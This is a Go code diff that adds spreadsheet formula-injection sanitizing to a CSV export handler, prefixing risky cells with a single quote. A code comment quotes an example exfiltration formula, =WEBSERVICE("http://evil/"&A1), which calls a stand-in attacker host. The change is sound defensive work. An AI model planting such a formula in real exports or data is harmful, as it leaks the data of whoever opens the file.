@@ -123,9 +123,37 @@ func (s *server) exportEntities(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
 	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", "export-"+typeID+".csv"))
 	cw := csv.NewWriter(w)
-	_ = cw.Write(out.Columns)
-	_ = cw.WriteAll(out.Rows)
+	_ = cw.Write(sanitizeCSVRow(out.Columns))
+	for _, row := range out.Rows {
+		_ = cw.Write(sanitizeCSVRow(row))
+	}
 	cw.Flush()
+}
+
+// sanitizeCSVCell neutralizes spreadsheet formula injection (CWE-1236). A
+// cell whose first character is =, +, -, @, tab or carriage return is
+// interpreted as a formula by common spreadsheet applications, so a stored
+// value such as =WEBSERVICE("http://evil/"&A1) would execute when a victim
+// opens the export — exfiltration or DDE. Prefixing the cell with a single
+// quote forces the application to read it as literal text; Content-Disposition
+// alone does not mitigate this.
+func sanitizeCSVCell(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
+}
+
+// sanitizeCSVRow neutralizes every cell of a row in place.
+func sanitizeCSVRow(row []string) []string {
+	for i, c := range row {
+		row[i] = sanitizeCSVCell(c)
+	}
+	return row
 }
 
 // exportRowSet resolves which entities to export: an explicit id list, an
